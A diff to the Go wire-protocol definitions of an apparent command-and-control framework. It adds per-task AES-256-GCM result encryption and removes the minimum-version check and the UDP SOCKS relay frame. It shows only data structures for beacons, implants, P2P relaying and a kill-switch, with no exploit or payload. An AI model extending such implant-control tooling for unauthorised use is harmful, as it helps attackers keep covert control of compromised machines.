@@ -4,10 +4,6 @@ package protocol
 // Increment when making breaking changes to the wire format.
 const CurrentProtocolVersion uint = 2
 
-// MinSupportedProtocolVersion is the oldest protocol version the server
-// will accept. Agents below this threshold are rejected immediately.
-const MinSupportedProtocolVersion uint = 2
-
 // Protocol v2 (breaking change over v1):
 //   - envelopes carry a monotonic per-agent sequence number (seq) and a
 //     Unix timestamp (ts); the server enforces a sliding replay window and
@@ -81,6 +77,11 @@ type TaskResult struct {
 	// computed by the agent (upload / chunked-download results). The server
 	// verifies it before committing the chunk to disk.
 	MAC string `json:"mac,omitempty"`
+	// EncryptedWithTaskKey flags that Output was sealed with the per-task
+	// AES-256-GCM key (task.Key) rather than the shared session key, giving
+	// per-result confidentiality independent of the beacon channel. The server
+	// decrypts using the key it generated for this task.
+	EncryptedWithTaskKey bool `json:"etk,omitempty"`
 }
 
 // BeaconResponse is sent by server to agent in reply to a check-in.
@@ -96,7 +97,7 @@ type BeaconResponse struct {
 	// RelayedFrames carries opaque response envelopes destined for P2P children.
 	// The parent forwards each envelope verbatim to the matching child.
 	RelayedReplies []RelayedReply `json:"relayed_replies,omitempty"`
-	ExtC2Data       []string      `json:"extc2_data,omitempty"`
+	ExtC2Data      []string       `json:"extc2_data,omitempty"`
 
 	// Fleet kill-switch broadcast (set only while armed): KillSwitch is the
 	// per-arm token (hex), KillSwitchMAC its per-implant authentication tag
@@ -144,6 +145,10 @@ type Task struct {
 	// MAC is the expected HMAC-SHA256 of Data for this push-upload chunk. The
 	// agent recomputes it and refuses to write on mismatch.
 	MAC string `json:"mac,omitempty"`
+	// Key carries an operator-issued, per-task AES-256-GCM key (base64) used to
+	// seal this task's result independently of the session key (P2: per-task
+	// encryption). Empty means the result travels under the normal channel key.
+	Key string `json:"key,omitempty"`
 }
 
 // SocksFrame carries SOCKS5 proxy relay data between agent and server.
@@ -151,17 +156,4 @@ type SocksFrame struct {
 	ConnID uint64 `json:"conn_id"`
 	Action string `json:"action"`
 	Data   []byte `json:"data,omitempty"`
-}
-
-// UDPAssociateFrame describes a single UDP datagram relayed through the SOCKS
-// tunnel. The server parses the SOCKS5 UDP request header from the operator,
-// extracts (DstAddr, DstPort, Data), and forwards them to the agent via this
-// struct (binary-encoded inside SocksFrame.Data). The agent sends back the
-// response payload with the original destination address so the server can
-// re-wrap the SOCKS5 UDP header.
-type UDPAssociateFrame struct {
-	ConnID  uint64 `json:"conn_id"`
-	Data    []byte `json:"data,omitempty"`
-	DstAddr string `json:"dst_addr,omitempty"`
-	DstPort int    `json:"dst_port,omitempty"`
 }
